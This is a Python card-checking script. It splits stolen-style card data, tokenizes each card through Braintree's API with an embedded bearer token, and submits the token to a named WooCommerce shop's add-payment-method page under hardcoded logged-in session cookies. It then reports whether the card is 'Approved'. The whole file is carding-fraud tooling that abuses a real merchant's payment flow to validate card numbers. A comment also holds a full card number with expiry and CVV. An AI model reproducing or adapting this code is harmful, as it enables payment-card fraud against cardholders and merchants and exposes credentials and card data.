import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	reu='#'
	
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-AE;q=0.6',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDMyNjA5MzAsImp0aSI6IjRiYjk2NmMwLTkyZGEtNDUzYy04MzUzLWFiYzAzNzRkMTEyZiIsInN1YiI6ImpzYnFoNzdoYjNqMzVtd20iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImpzYnFoNzdoYjNqMzVtd20iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.AkHFpL-7n5XpSzkqqbEEitaUd9qQqEjXsTyM5s0hRvQVwJRSNCWni4ORoJPf9ZIDXtkAtQetNjGaYb3OreEDaA',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'ef11df88-533b-401b-83db-1515abaeef7d',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"ef11df88-533b-401b-83db-1515abaeef7d"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5168155026959683","expirationMonth":"08","expirationYear":"2025","cvv":"555"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	id=(response.json()['data']['tokenizeCreditCard']['token'])
	cookies = {
	    'apbct_site_referer': 'UNKNOWN',
	    'wordpress_logged_in_b11649193abc24c881cdab50e9bfa64c': 'hhfygdofcv%7C1704337134%7C027xjX7SPM1uImBlujkFMsLQqQWvoWTrQDjSe5PeTdJ%7Cca72e0c3b432935fe7b07af84b0f867c6255f8415df86f616c98173feb5b6e4c',
	    'apbct_site_landing_ts': '1703174382',
	    'ct_sfw_pass_key': '78e8eb6d68a8f17d123d8461615ed85f0',
	    'wfwaf-authcookie-ea7f28c23ebbc0b6e3296f9d33b62020': '216%7Cother%7Cread%7C43bfe844fd2648bba228ee9414dec1f21d565607d144237e9206b3ffa2cde8d6',
	    'ct_timezone': '2',
	    'apbct_headless': 'false',
	    'ct_checked_emails': '0',
	    'ct_checkjs': '685278242',
	    'ct_mouse_moved': 'true',
	    'ct_has_scrolled': 'true',
	    'ct_has_input_focused': 'true',
	    'ct_has_key_up': 'true',
	    'apbct_prev_referer': 'https%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fpayment-methods%2F',
	    'ct_ps_timestamp': '1703174526',
	    'ct_screen_info': '%7B%22fullWidth%22%3A327%2C%22fullHeight%22%3A1297%2C%22visibleWidth%22%3A327%2C%22visibleHeight%22%3A639%7D',
	    'ct_fkp_timestamp': '1703174557',
	    'ct_pointer_data': '%5B%5B279%2C99%2C30990%5D%2C%5B208%2C231%2C33008%5D%2C%5B332%2C224%2C41254%5D%5D',
	    'apbct_timestamp': '1703174567',
	    'apbct_page_hits': '9',
	    'apbct_cookies_test': '%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522badcf31e585e7a9dbffcfa9bc398b1fb%2522%257D',
	    'apbct_urls': '%7B%22www.blackorchidcouture.com%2F%22%3A%5B1703174382%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2F%22%3A%5B1703174437%2C1703174502%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2Fshipping%2F%22%3A%5B1703174451%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1703174517%5D%2C%22www.blackorchidcouture.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framewor%22%3A%5B1703174567%5D%7D',
	}
	
	headers = {
	    'authority': 'www.blackorchidcouture.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-AE;q=0.6',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'apbct_site_referer=UNKNOWN; wordpress_logged_in_b11649193abc24c881cdab50e9bfa64c=hhfygdofcv%7C1704337134%7C027xjX7SPM1uImBlujkFMsLQqQWvoWTrQDjSe5PeTdJ%7Cca72e0c3b432935fe7b07af84b0f867c6255f8415df86f616c98173feb5b6e4c; apbct_site_landing_ts=1703174382; ct_sfw_pass_key=78e8eb6d68a8f17d123d8461615ed85f0; wfwaf-authcookie-ea7f28c23ebbc0b6e3296f9d33b62020=216%7Cother%7Cread%7C43bfe844fd2648bba228ee9414dec1f21d565607d144237e9206b3ffa2cde8d6; ct_timezone=2; apbct_headless=false; ct_checked_emails=0; ct_checkjs=685278242; ct_mouse_moved=true; ct_has_scrolled=true; ct_has_input_focused=true; ct_has_key_up=true; apbct_prev_referer=https%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fpayment-methods%2F; ct_ps_timestamp=1703174526; ct_screen_info=%7B%22fullWidth%22%3A327%2C%22fullHeight%22%3A1297%2C%22visibleWidth%22%3A327%2C%22visibleHeight%22%3A639%7D; ct_fkp_timestamp=1703174557; ct_pointer_data=%5B%5B279%2C99%2C30990%5D%2C%5B208%2C231%2C33008%5D%2C%5B332%2C224%2C41254%5D%5D; apbct_timestamp=1703174567; apbct_page_hits=9; apbct_cookies_test=%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522badcf31e585e7a9dbffcfa9bc398b1fb%2522%257D; apbct_urls=%7B%22www.blackorchidcouture.com%2F%22%3A%5B1703174382%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2F%22%3A%5B1703174437%2C1703174502%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2Fshipping%2F%22%3A%5B1703174451%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1703174517%5D%2C%22www.blackorchidcouture.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framewor%22%3A%5B1703174567%5D%7D',
	    'origin': 'https://www.blackorchidcouture.com',
	    'referer': 'https://www.blackorchidcouture.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': 'braintree_credit_card',
	    'wc-braintree-credit-card-card-type': 'master-card',
	    'wc-braintree-credit-card-3d-secure-enabled': '',
	    'wc-braintree-credit-card-3d-secure-verified': '',
	    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
	    'wc_braintree_credit_card_payment_nonce': id,
	    'wc_braintree_device_data': '{"correlation_id":"a15b60946dd620efdbdc4b93855a57ad"}',
	    'wc-braintree-credit-card-tokenize-payment-method': 'true',
	    'woocommerce-add-payment-method-nonce': '9c7fd13c63',
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoxMH19',
	}
	
	response = requests.post(
	    'https://www.blackorchidcouture.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text=(response.text)
	import re
	pattern = r"Status code \d+: (.+?)\s*</li>"
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Nice! New payment method added' in text or 'avs' in text:
			return f'Approved {reu}'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			print(text)
			return 'risk_threshold'